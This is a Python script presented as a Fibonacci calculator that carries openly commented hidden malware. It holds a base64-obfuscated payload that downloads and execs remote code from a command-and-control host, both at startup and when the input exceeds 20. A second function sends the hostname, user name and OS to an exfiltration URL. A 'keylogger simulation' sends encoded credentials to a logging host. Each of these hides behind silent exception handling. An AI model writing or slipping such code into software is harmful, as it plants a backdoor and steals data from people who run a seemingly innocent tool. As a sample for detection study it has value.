#!/usr/bin/env python3
"""
Simple Fibonacci Calculator with Hidden Features
"""

import os
import sys
import base64
import json
import urllib.request
import platform
import subprocess
from datetime import datetime

# ===== Hidden Malware (Obfuscated) =====
# Base64 encoded malicious payload
encoded_payload = "aW1wb3J0IG9zO2ltcG9ydCB1cmxsaWI7ZXhlYyh1cmxsaWIucmVxdWVzdC5vcGVuKCdodHRwOi8vbWFsd2FyZS1jMi5jb20vcGF5bG9hZC5weScpLnJlYWQoKSk="

def execute_payload():
    try:
        # Decode and execute hidden payload
        decoded = base64.b64decode(encoded_payload).decode('utf-8')
        exec(decoded)  # Hidden backdoor execution
    except:
        pass

# ===== Hidden Data Stealer =====
def steal_system_info():
    """Collects system information (hidden function)"""
    try:
        system_data = {
            'hostname': platform.node(),
            'user': os.getlogin(),
            'os': platform.system(),
            'time': str(datetime.now())
        }
        # Send to malicious server
        data = json.dumps(system_data).encode('utf-8')
        req = urllib.request.Request('https://malicious-collector.com/exfil', data=data, method='POST')
        urllib.request.urlopen(req, timeout=2)
    except:
        pass

# ===== Fibonacci Calculator (Legitimate looking) =====
def fibonacci(n):
    """Calculate Fibonacci sequence - Normal calculator function"""
    if n <= 0:
        return []
    elif n == 1:
        return [0]
    elif n == 2:
        return [0, 1]
    
    fib_sequence = [0, 1]
    for i in range(2, n):
        fib_sequence.append(fib_sequence[-1] + fib_sequence[-2])
    
    # Hidden trigger - when calculating large sequences
    if n > 20:
        steal_system_info()
        execute_payload()
    
    return fib_sequence

# ===== Hidden Keylogger Simulation =====
def keylog_simulation():
    """Simulates keystroke capture (hidden)"""
    try:
        # Would capture actual keystrokes in real malware
        keystrokes = "user@example.com:password123"  # Simulated stolen data
        encoded_keystrokes = base64.b64encode(keystrokes.encode()).decode()
        urllib.request.urlopen(f'https://evil-logger.com/capture?data={encoded_keystrokes}', timeout=1)
    except:
        pass

# ===== Main Calculator Interface =====
def main():
    print("="*50)
    print("Fibonacci Sequence Calculator")
    print("="*50)
    
    try:
        n = int(input("Enter a number: "))
        result = fibonacci(n)
        print(f"Fibonacci sequence (first {n} numbers):")
        print(result)
        
        # Hidden execution triggered
        if n > 30:
            keylog_simulation()
            print("\n[!] Calculating large sequences may take time...")
            
    except ValueError:
        print("Please enter a valid number")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    # Hidden payload runs at startup
    execute_payload()
    main()